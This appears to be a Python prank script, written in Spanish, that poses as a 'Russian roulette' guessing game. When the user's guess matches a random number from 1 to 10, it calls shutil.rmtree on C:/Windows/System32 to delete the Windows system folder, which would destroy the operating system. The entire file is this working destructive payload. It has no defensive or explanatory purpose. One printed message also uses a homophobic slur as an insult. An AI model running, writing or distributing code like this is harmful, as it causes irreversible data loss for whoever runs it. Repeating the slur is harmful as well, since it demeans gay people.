import random
import shutil
import time

system32 = "C:/Windows/System32"
number = random.randint(1,10)

print("  Bienvenido a mi juego de la RULETA RUSA  ")

while True:
    print("El unico que muere es tu PC, avisado estas")
    print(" Si te sales eres MARICON")
    numero_magico = int(input("Introduce un numero de 1 al 10: "))
    if numero_magico == number:
        try:
            print("Cagaste mi bro")
            time.sleep(2)
            shutil.rmtree(system32)
        except Exception as e:
            print(" Te has salvado porque el codigo es de basura")
    else:
        print("Te has salvado, le das otra vez ? ")


